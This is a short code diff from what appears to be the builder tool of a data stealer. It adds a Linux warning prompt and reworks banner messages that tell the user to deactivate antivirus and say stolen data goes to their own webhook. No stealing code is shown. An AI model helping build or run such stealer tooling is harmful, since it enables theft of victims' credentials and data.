@@ -148,12 +148,18 @@ try:
         except:
             return "Invalid"
 
-    Slow(f"""{virus_banner}                                                                           
-{BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
+    Slow(virus_banner)
+
+    if sys.platform.startswith("linux"):
+        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} On Linux, the builder does not work very well.")
+        choice = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Do you still want to continue ? (y/n) -> {reset}")
+        if not choice in ['y', 'Y', 'Yes', 'yes', 'YES']:
+            Reset()
+
+    Slow(f"""{BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
 {BEFORE + current_time_hour() + AFTER} {INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
 {BEFORE + current_time_hour() + AFTER} {INFO} Deactivate your antivirus so that no files are deleted after your build.
 {BEFORE + current_time_hour() + AFTER} {INPUT} Builder:""")
-    time.sleep(1)
     
     # <<<<<<<<<< Logs >>>>>>>>>>
     def error_logs(message):
